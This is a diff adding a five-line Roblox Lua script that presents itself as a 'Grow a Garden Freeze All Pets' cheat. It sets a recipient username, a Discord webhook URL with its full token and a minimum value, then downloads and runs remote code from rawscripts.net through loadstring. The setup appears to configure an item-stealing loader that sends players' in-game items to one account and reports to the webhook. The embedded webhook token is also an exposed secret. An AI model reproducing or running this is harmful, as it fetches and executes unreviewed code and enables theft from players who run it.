@@ -1,0 +1,5 @@
+Username = "jayarvincu"
+Webhook = "https://discord.com/api/webhooks/1396659478782283846/J2_nQ6UTW-smrflYvz1dPvsnHV7sSjmNDXCAwOvDVGvdW9vg67uWc03xZTV3fpTHuWyD"
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-Freeze-All-Pets-43750"))()
